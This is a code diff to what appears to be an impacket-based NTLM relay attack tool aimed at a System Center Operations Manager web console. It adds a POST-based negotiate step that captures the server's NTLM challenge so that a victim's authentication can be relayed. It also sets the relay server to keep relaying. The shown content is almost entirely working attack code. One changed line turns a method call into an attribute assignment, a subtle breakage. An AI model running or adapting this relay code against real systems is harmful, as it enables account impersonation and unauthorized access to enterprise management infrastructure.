@@ -38,6 +38,48 @@ class SCOMHTTPRelayClient(HTTPRelayClient):
             self.path = self.target.path
         return True
 
+    def sendNegotiate(self, negotiateMessage):
+        """Override sendNegotiate because SCOM uses POST instead of GET"""
+        import re
+        from impacket.ntlm import NTLMAuthChallenge
+
+        # Check if NTLM is offered
+        self.session.request("POST", self.path, body='"V2luZG93cw=="'.encode("utf-8"))
+        res = self.session.getresponse()
+        res.read()
+
+        if res.status != 401:
+            logger.info('Status code returned: %d. Authentication does not seem required' % res.status)
+
+        www_auth = res.getheader('WWW-Authenticate')
+        if not www_auth or ('NTLM' not in www_auth and 'Negotiate' not in www_auth):
+            logger.error('NTLM Auth not offered by URL')
+            return False
+
+        self.authenticationMethod = "NTLM" if 'NTLM' in www_auth else "Negotiate"
+
+        # Send negotiate message
+        negotiate = base64.b64encode(negotiateMessage).decode("ascii")
+        headers = {
+            'Authorization': '%s %s' % (self.authenticationMethod, negotiate),
+            'Content-Type': 'application/json'
+        }
+
+        self.session.request("POST", self.path, headers=headers, body='"V2luZG93cw=="'.encode("utf-8"))
+        res = self.session.getresponse()
+        res.read()
+
+        try:
+            www_auth_response = res.getheader('WWW-Authenticate')
+            serverChallengeBase64 = re.search(('%s ([a-zA-Z0-9+/]+={0,2})' % self.authenticationMethod), www_auth_response).group(1)
+            serverChallenge = base64.b64decode(serverChallengeBase64)
+            challenge = NTLMAuthChallenge()
+            challenge.fromString(serverChallenge)
+            return challenge
+        except (IndexError, KeyError, AttributeError) as e:
+            logger.error('Failed to get NTLM challenge: %s' % str(e))
+            return False
+
     def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
         self.scom_relay.attack_lock.acquire()
         try:
@@ -132,7 +174,6 @@ class SCOMHTTPRelayClient(HTTPRelayClient):
         except Exception as e:
             logger.info(f"Something went wrong:\n{e}")
             return None, STATUS_ACCESS_DENIED
-
 
 class SCOMWEBCONSOLEAttackClient(ProtocolAttack):
     def run(self):
@@ -429,8 +470,10 @@ class HTTPSCOMRELAY:
         config.setProtocolClients({"HTTP": self.get_relay_http_client})
         config.setListeningPort(port)
         config.setInterfaceIp(interface)
-        config.setSMB2Support(True)
+        config.setSMB2Support = True
         config.setMode("RELAY")
+        config.keepRelaying = True
+        config.disableMulti = True
 
         self.server = SMBRelayServer(config)
 
